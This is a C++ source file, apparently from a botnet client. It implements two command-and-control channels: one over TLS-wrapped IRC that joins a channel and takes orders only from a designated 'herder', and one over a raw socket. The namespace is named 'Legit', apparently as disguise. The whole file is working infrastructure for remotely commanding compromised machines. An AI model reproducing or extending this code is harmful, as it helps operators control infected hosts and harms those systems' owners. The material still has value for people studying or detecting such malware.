#include "Environment.hpp"
#include "Channels.hpp"
#include "SecureSocket.hpp"

using namespace Legit;
using namespace std;

IrcCommandChannel::IrcCommandChannel(string host, string port, string channel, string nick, string herder, string pem) :
    channel_(channel),
    herder_(herder),
    client_(make_unique<SecureSocket>(host, port, make_unique<CertStore>(pem, false), 500), nick)
{
    while (!client_.ReceivedFirstPing())
    {
        client_.Receive();
    }
    client_.Send("JOIN " + channel + "\r\n");
}

IrcCommandChannel::~IrcCommandChannel()
{
    client_.Send("QUIT out\r\n");
}

void IrcCommandChannel::Send(string message)
{
    client_.Send("PRIVMSG " + herder_ + " :" + message + "\r\n");
}

string IrcCommandChannel::Receive()
{
    auto message = client_.Receive();
    if (message.command == "PRIVMSG")
    { 
        if (message.params[0] == channel_ || message.GetReturnName() == herder_)
            return message.params[1];
    }

    return "";
}

CustomCommandChannel::CustomCommandChannel(string host, string port, string nick, string pem) : 
    //socket_(make_unique<SecureSocket>(host, port, make_unique<CertStore>(pem, false)))
    socket_(make_unique<Socket>(host, port))
{
    socket_->Send(nick + "\r\n");
}

CustomCommandChannel::~CustomCommandChannel()
{

}

void CustomCommandChannel::Send(string message)
{
    socket_->Send(message + "\r\n");
}

string CustomCommandChannel::Receive()
{
    auto endline = remains_.find("\r\n");
    while (endline == string::npos)
    {
        char buffer[4096];
        memset(buffer, 0, sizeof(buffer));
        auto bytesRead = socket_->Receive(buffer, sizeof(buffer));
        if (bytesRead >= 0)
            remains_.append(buffer, bytesRead);
        else
            return "";
        endline = remains_.find("\r\n");
    }

    string result = remains_.substr(0, endline);
    remains_ = remains_.substr(endline + 2);

    return result; 
}

